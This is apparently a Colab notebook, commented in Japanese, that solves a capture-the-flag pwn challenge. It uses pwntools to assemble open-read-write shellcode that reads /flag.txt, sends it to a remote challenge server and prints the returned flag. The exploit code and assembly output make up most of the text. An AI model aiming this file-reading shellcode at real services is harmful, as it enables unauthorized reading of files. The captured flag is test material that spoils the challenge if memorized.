In [2]:
!pip install pwntools -q

   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 12.9/12.9 MB 82.6 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.5/2.5 MB 79.0 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 223.9/223.9 kB 14.9 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 188.5/188.5 kB 13.6 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 90.6/90.6 kB 6.4 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 16.3/16.3 MB 59.5 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 74.8/74.8 kB 5.4 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 278.2/278.2 kB 20.0 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 161.0/161.0 kB 11.0 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.4/1.4 MB 54.8 MB/s eta 0:00:00
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 127.4/127.4 kB 8.8 MB/s eta 0:00:00


In [3]:
import os
# Google Colab環境でpwntoolsを動かすための設定
os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

# 接続先の設定
HOST = '34.170.146.252'
PORT = 39313

# アーキテクチャの設定 (amd64)
context.clear(arch='amd64', log_level='info')

# --- シェルコードの組み立て (ORW) ---
# 1. Open: サーバー上の /flag.txt を開く
sc = shellcraft.open('/flag.txt')

# 2. Read: 開いたファイルからスタック(rsp)へデータを読み込む
sc += shellcraft.read('rax', 'rsp', 0x100)

# 3. Write: スタック(rsp)のデータを標準出力(fd=1)へ書き出す
sc += shellcraft.write(1, 'rsp', 0x100)

# アセンブリを機械語にコンパイル
shellcode = asm(sc)

print(f"[*] {HOST}:{PORT} に接続します...")
p = remote(HOST, PORT)

# "paca?\n" というプロンプトが出力されるまで待機
p.recvuntil(b"paca?\n")

print("[*] シェルコードを送信します...")
p.send(shellcode)

# サーバーからの出力を全て受け取って表示
print("[*] 応答を待機中...")
output = p.recvall(timeout=5).decode(errors='ignore')

print("\n[*] 実行結果:")
print(output)

DEBUG:pwnlib.asm:cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/local/lib/python3.12/dist-packages/pwnlib/data/includes
DEBUG:pwnlib.asm:Assembling
.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.intel_syntax noprefix
.p2align 0
    /* open(file='/flag.txt', oflag=0, mode=0) */
    /* push b'/flag.txt\x00' */
    push 0x74
    mov rax, 0x78742e67616c662f
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push 2 /* 2 */
    pop rax
    syscall
    /* call read('rax', 'rsp', 0x100) */
    mov rdi, rax
    xor eax, eax /* SYS_read */
    xor edx, edx
    mov dh, 0x100 >> 8
    mov rsi, rsp
    syscall
    /* write(fd=1, buf='rsp', n=0x100) */
    push 1
    pop rdi
    xor edx, edx
    mov dh, 0x100 >> 8
    mov rsi, rsp
    /* call write() */
    push 1 /* 1 */
    pop rax
    syscall

DEBUG:pwnlib.asm:/usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-sf5mf38_/step2 /tmp/pwn-asm-sf5mf38_

[*] 34.170.146.252:39313 に接続します...
[x] Opening connection to 34.170.146.252 on port 39313


INFO:pwnlib.tubes.remote.remote.137387081996224:Opening connection to 34.170.146.252 on port 39313


[x] Opening connection to 34.170.146.252 on port 39313: Trying 34.170.146.252


INFO:pwnlib.tubes.remote.remote.137387081996224:Opening connection to 34.170.146.252 on port 39313: Trying 34.170.146.252


...

[+] Receiving all data: Done (262B)


INFO:pwnlib.tubes.remote.remote.137387081996224:Receiving all data: Done (262B)


[*] Closed connection to 34.170.146.252 port 39313


INFO:pwnlib.tubes.remote.remote.137387081996224:Closed connection to 34.170.146.252 port 39313



[*] 実行結果:
paca!
Congrats!!!!!
Flag is here: Alpaca{Okay!!!repeat_after_me!!open->read->write:)FOOOOOOOOOOOOOO!!!!}csy               =@      V>  ?bsy?"]?                             po   {S.Po  1>  o  =@     o  0@             
